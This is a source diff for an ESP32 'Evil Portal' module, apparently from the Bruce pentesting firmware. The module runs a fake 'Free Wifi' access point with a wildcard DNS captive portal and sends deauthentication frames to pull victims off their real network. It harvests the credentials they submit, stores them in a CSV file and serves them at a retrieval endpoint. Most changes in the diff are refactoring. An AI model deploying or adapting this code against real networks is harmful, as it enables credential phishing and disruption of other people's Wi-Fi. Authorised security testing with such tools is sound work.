@@ -9,36 +9,42 @@
 #include "esp_wifi.h"
 #include "wifi_atks.h"
 
+static DNSServer &sharedEvilPortalDnsServer() {
+    static DNSServer server;
+    return server;
+}
+
 EvilPortal::EvilPortal(
     String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode
 )
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
       _backgroundMode(backgroundMode), webServer(80), _launchTime(millis()) {
-    
+    dnsServer = &sharedEvilPortalDnsServer();
+
     _originalWifiMode = WiFi.getMode();
     _wifiWasConnected = (WiFi.status() == WL_CONNECTED);
-    
+
     if (!setup()) return;
     cleanlyStopWebUiForWiFiFeature();
     beginAP();
-    if (!_backgroundMode) {
-        loop();
-    }
+    if (!_backgroundMode) { loop(); }
 }
 
-EvilPortal::~EvilPortal() {
-}
+EvilPortal::~EvilPortal() {}
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     AsyncResponseStream *response = request->beginResponseStream("text/html");
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
-    else if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
-             bruceConfig.evilPortalEndpoints.allowGetCreds)
+    else if (
+        url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
+        bruceConfig.evilPortalEndpoints.allowGetCreds
+    )
         request->send(200, "text/html", _portal->creds_GET());
-    else if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
-             bruceConfig.evilPortalEndpoints.allowSetSsid) {
+    else if (
+        url == bruceConfig.evilPortalEndpoints.setSsidEndpoint && bruceConfig.evilPortalEndpoints.allowSetSsid
+    ) {
         if (request->hasArg("ssid")) {
             _portal->apName = request->arg("ssid").c_str();
             request->send(200, "text/html", _portal->ssid_POST());
@@ -53,7 +59,9 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
 }
 
 bool EvilPortal::setup() {
-    if (apGateway == IPAddress((uint32_t)0)) apGateway = IPAddress(192, 168, 4, 1);
+    if (apGateway == IPAddress((uint32_t)0)) {
+        if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
+    }
     if (apName.isEmpty()) apName = "Free Wifi";
 
     if (_autoMode) {
@@ -98,6 +106,10 @@ bool EvilPortal::setup() {
     }
 
     options = {
+        {"Default",
+         [this]() {
+             if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
+         }                                                                 },
         {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
         {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
     };
@@ -128,7 +140,7 @@ void EvilPortal::beginAP() {
     while (millis() - tmp < 3000) yield();
 
     setupRoutes();
-    dnsServer.start(53, "*", WiFi.softAPIP());
+    dnsServer->start(53, "*", WiFi.softAPIP());
     webServer.begin();
 }
 
@@ -244,19 +256,19 @@ void EvilPortal::setupRoutes() {
 
 void EvilPortal::restartWiFi(bool reset) {
     webServer.end();
-    dnsServer.stop();
+    dnsServer->stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
-    
+
     _captiveHandler = nullptr;
-    
+
     wifiDisconnect();
     WiFi.softAP(apName, emptyString, _channel);
     vTaskDelay(100 / portTICK_PERIOD_MS);
-    
+
     setupRoutes();
-    dnsServer.start(53, "*", WiFi.softAPIP());
+    dnsServer->start(53, "*", WiFi.softAPIP());
     webServer.begin();
-    
+
     if (reset) resetCapturedCredentials();
 }
 
@@ -275,7 +287,7 @@ void EvilPortal::loop() {
             shouldRedraw = false;
         }
 
-        dnsServer.processNextRequest();
+        dnsServer->processNextRequest();
 
         if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
             send_raw_frame(deauth_frame, 26);
@@ -295,38 +307,39 @@ void EvilPortal::loop() {
         if (check(EscPress)) {
             options = {
                 {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
-                {"View Creds", [this, &shouldRedraw]() {
-                    FS *fs;
-                    if (getFsStorage(fs)) {
-                        if (fs->exists("/BruceEvilCreds")) {
-                            loopSD(*fs, false, "CSV", "/BruceEvilCreds");
-                        } else {
-                            displayTextLine("No credentials yet");
-                            vTaskDelay(1000);
-                        }
-                    }
-                    shouldRedraw = true;
-                }},
+                {"View Creds",
+                 [this, &shouldRedraw]() {
+                     FS *fs;
+                     if (getFsStorage(fs)) {
+                         if (fs->exists("/BruceEvilCreds")) {
+                             loopSD(*fs, false, "CSV", "/BruceEvilCreds");
+                         } else {
+                             displayTextLine("No credentials yet");
+                             vTaskDelay(1000);
+                         }
+                     }
+                     shouldRedraw = true;
+                 }},
                 {"Resume", [&shouldRedraw]() { shouldRedraw = true; }}
             };
-            
+
             loopOptions(options);
             if (exitPortal) {
                 displayTextLine("Shutting down...");
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-                
+
                 webServer.end();
                 vTaskDelay(200 / portTICK_PERIOD_MS);
-                
-                dnsServer.stop();
+
+                dnsServer->stop();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-                
+
                 WiFi.mode(_originalWifiMode);
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-                
+
                 wifiDisconnect();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-                
+
                 return;
             }
             shouldRedraw = true;
@@ -341,7 +354,7 @@ void EvilPortal::loop() {
 
 void EvilPortal::processRequests() {
     if (!_backgroundMode) return;
-    dnsServer.processNextRequest();
+    dnsServer->processNextRequest();
     if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
         previousTotalCapturedCredentials = totalCapturedCredentials - 1;
     }
@@ -353,13 +366,9 @@ String EvilPortal::getCapturedPassword() { return lastCred; }
 
 String EvilPortal::getCapturedSSID() { return apName; }
 
-void EvilPortal::setBaseDuration(uint16_t seconds) {
-    _baseDurationSec = seconds;
-}
+void EvilPortal::setBaseDuration(uint16_t seconds) { _baseDurationSec = seconds; }
 
-void EvilPortal::setExtendedDuration(uint16_t seconds) {
-    _extendedDurationSec = seconds;
-}
+void EvilPortal::setExtendedDuration(uint16_t seconds) { _extendedDurationSec = seconds; }
 
 bool EvilPortal::hasRecentActivity() {
     if (totalCapturedCredentials > previousTotalCapturedCredentials) {
@@ -369,18 +378,14 @@ bool EvilPortal::hasRecentActivity() {
     return (millis() - _lastActivityTime < 5000);
 }
 
-bool EvilPortal::hasRecentPageView() {
-    return (millis() - _lastPageViewTime < 30000);
-}
+bool EvilPortal::hasRecentPageView() { return (millis() - _lastPageViewTime < 30000); }
 
-void EvilPortal::recordPageView() {
-    _lastPageViewTime = millis();
-}
+void EvilPortal::recordPageView() { _lastPageViewTime = millis(); }
 
 bool EvilPortal::shouldTerminate() {
     unsigned long currentTime = millis();
     unsigned long elapsed = currentTime - _launchTime;
-    
+
     if (_durationExtended) {
         return elapsed > (_extendedDurationSec * 1000);
     } else {
@@ -390,7 +395,7 @@ bool EvilPortal::shouldTerminate() {
 
 void EvilPortal::checkAndExtendDuration() {
     if (_durationExtended) return;
-    
+
     if (hasRecentActivity()) {
         _durationExtended = true;
         Serial.println("[PORTAL] Activity detected, extending duration");
@@ -481,9 +486,7 @@ void EvilPortal::loadCustomHtml() {
         int apStart = firstLine.indexOf("<!-- AP=\"");
         if (apStart != -1) {
             int apEnd = firstLine.indexOf("\" -->", apStart);
-            if (apEnd != -1) {
-                apName = firstLine.substring(apStart + 9, apEnd);
-            }
+            if (apEnd != -1) { apName = firstLine.substring(apStart + 9, apEnd); }
         }
     }
 }
@@ -794,7 +797,10 @@ void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
     log_i("data saved");
 }
 
-void EvilPortal::apName_from_keyboard() { apName = keyboard("Free Wifi", 30, "Evil Portal SSID:"); }
+void EvilPortal::apName_from_keyboard() {
+    apName = keyboard("Free Wifi", 30, "Evil Portal SSID:");
+    if (apName == "\x1B") apName = "Free Wifi";
+}
 
 bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     bool isConnected = false;
